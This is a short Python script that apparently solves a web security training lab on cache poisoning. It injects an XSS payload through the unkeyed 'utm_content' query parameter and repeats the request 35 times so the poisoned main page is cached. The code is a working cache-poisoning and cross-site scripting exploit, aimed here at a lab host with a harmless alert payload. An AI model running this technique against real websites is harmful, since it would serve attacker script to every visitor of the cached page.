##############################################################
#
# Lab: Web cache poisoning via an unkeyed query parameter
#
# Hack Steps:
#      1. Inject payload as a query parameter
#      2. Send multiple request to the main page to cache it
#         with the injected payload
#
##############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6800e203302e0a80e0bcdc000e0066.web-security-academy.net" 

def main():
    payload = """'><img src%3d1 onerror%3dalert(1)>"""
    
    # 5 times is enough for caching
    # 35 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for counter in range(1,36):
        print(Fore.WHITE + f"❯❯ Poisoning the main page with the payload as a query parameter ({counter}/35).. ", end="\r", flush=True)
        
        requests.get(f"{LAB_URL}/?utm_content={payload}")

    print(Fore.WHITE + "❯❯ Poisoning the main page with the payload as a query parameter (35/35).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The main page is poisoned successfully")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()